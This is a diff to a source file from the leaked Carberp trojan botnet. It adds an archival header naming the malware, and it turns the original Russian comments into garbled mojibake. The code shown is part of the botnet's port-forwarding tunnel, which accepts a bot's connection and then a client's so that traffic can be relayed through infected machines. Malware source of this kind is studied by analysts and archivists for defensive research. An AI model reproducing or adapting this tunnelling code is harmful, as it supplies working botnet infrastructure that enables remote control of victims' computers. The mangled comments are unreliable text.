@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 #include <winsock2.h>
 #include <windows.h>
@@ -12,7 +23,7 @@ struct TUNNEL_INFO
 	SOCKET client;
 };
 
-static int lastOpenPort = 10000; //Последний открытый порт
+static int lastOpenPort = 10000; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
 int CreatePort(SOCKET& sc)
 {
@@ -52,14 +63,14 @@ void WINAPI StartPortForw(TUNNEL_INFO *tunnelInfo)
 	{
 		sockaddr_in sa1;
 		int sz_sa = sizeof(sa1);
-		SOCKET s1 = accept( tunnelInfo->bot, (sockaddr*)&sa1, &sz_sa ); //ждем когда соединится бот
+		SOCKET s1 = accept( tunnelInfo->bot, (sockaddr*)&sa1, &sz_sa ); //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 		if( s1 != INVALID_SOCKET )
 		{
 			while(true)
 			{
 				sockaddr_in sa2;
 				int sz_sa = sizeof(sa2);
-				SOCKET s2 = accept( tunnelInfo->client, (sockaddr*)&sa2, &sz_sa ); //ждем когда подключаться к клиенту
+				SOCKET s2 = accept( tunnelInfo->client, (sockaddr*)&sa2, &sz_sa ); //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				if( s2 != INVALID_SOCKET )
 				{
 				    while (true)
